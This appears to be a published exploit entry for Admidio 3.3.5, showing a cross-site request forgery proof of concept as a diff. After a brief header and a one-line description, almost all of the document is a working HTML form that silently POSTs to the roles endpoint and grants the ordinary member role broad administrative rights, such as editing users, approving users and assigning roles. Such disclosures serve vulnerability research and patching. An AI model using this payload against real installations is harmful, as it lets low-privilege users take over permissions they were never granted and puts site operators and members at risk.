@@ -1,0 +1,51 @@
+# Exploit Title: Admidio 3.3.5 - Cross-Site Request Forgery (Change Permissions)
+# Author: Nawaf Alkeraithe
+# Date: 2018-09-01
+# Vendor Homepage: https://www.admidio.org/
+# Software Link: https://sourceforge.net/projects/admidio/files/Admidio/3.3.x/admidio-3.3.5.zip/download
+# Version: 3.3.5
+# Tested on: PHP
+# CVE: N/A
+
+# Description:
+# Low Privilage users are able to increase their permissions due to improper origin checking
+# by the vendor. 
+
+<html>
+<form enctype="application/x-www-form-urlencoded" method="POST" action="http://Target/adm_program/modules/roles/roles_function.php?rol_id=2&mode=2">
+	<table>
+		<tr><td>rol_name</td><td><input type="text" value="Member" name="rol_name"></td></tr>
+		<tr><td>rol_description</td><td><input type="text" value="All+organization+members" name="rol_description"></td></tr>
+		<tr><td>rol_cat_id</td><td><input type="text" value="4" name="rol_cat_id"></td></tr>
+		<tr><td>rol_mail_this_role</td><td><input type="text" value="2" name="rol_mail_this_role"></td></tr>
+		<tr><td>rol_this_list_view</td><td><input type="text" value="1" name="rol_this_list_view"></td></tr>
+		<tr><td>rol_leader_rights</td><td><input type="text" value="3" name="rol_leader_rights"></td></tr>
+		<tr><td>rol_lst_id</td><td><input type="text" value="0" name="rol_lst_id"></td></tr>
+		<tr><td>rol_default_registration</td><td><input type="text" value="1" name="rol_default_registration"></td></tr>
+		<tr><td>rol_max_members</td><td><input type="text" value="" name="rol_max_members"></td></tr>
+		<tr><td>rol_cost</td><td><input type="text" value="" name="rol_cost"></td></tr>
+		<tr><td>rol_cost_period</td><td><input type="text" value="" name="rol_cost_period"></td></tr>
+		<tr><td>rol_assign_roles</td><td><input type="text" value="1" name="rol_assign_roles"></td></tr>
+		<tr><td>rol_all_lists_view</td><td><input type="text" value="1" name="rol_all_lists_view"></td></tr>
+		<tr><td>rol_approve_users</td><td><input type="text" value="1" name="rol_approve_users"></td></tr>
+		<tr><td>rol_edit_user</td><td><input type="text" value="1" name="rol_edit_user"></td></tr>
+		<tr><td>rol_mail_to_all</td><td><input type="text" value="1" name="rol_mail_to_all"></td></tr>
+		<tr><td>rol_profile</td><td><input type="text" value="1" name="rol_profile"></td></tr>
+		<tr><td>rol_announcements</td><td><input type="text" value="1" name="rol_announcements"></td></tr>
+		<tr><td>rol_dates</td><td><input type="text" value="1" name="rol_dates"></td></tr>
+		<tr><td>rol_photo</td><td><input type="text" value="1" name="rol_photo"></td></tr>
+		<tr><td>rol_download</td><td><input type="text" value="1" name="rol_download"></td></tr>
+		<tr><td>rol_guestbook</td><td><input type="text" value="1" name="rol_guestbook"></td></tr>
+		<tr><td>rol_guestbook_comments</td><td><input type="text" value="1" name="rol_guestbook_comments"></td></tr>
+		<tr><td>rol_weblinks</td><td><input type="text" value="1" name="rol_weblinks"></td></tr>
+		<tr><td>rol_start_date</td><td><input type="text" value="" name="rol_start_date"></td></tr>
+		<tr><td>rol_end_date</td><td><input type="text" value="" name="rol_end_date"></td></tr>
+		<tr><td>rol_start_time</td><td><input type="text" value="" name="rol_start_time"></td></tr>
+		<tr><td>rol_end_time</td><td><input type="text" value="" name="rol_end_time"></td></tr>
+		<tr><td>rol_weekday</td><td><input type="text" value="" name="rol_weekday"></td></tr>
+		<tr><td>rol_location</td><td><input type="text" value="" name="rol_location"></td></tr>
+		<tr><td>btn_save</td><td><input type="text" value="" name="btn_save"></td></tr>
+	</table>
+<input type="submit">
+</form>
+</html>
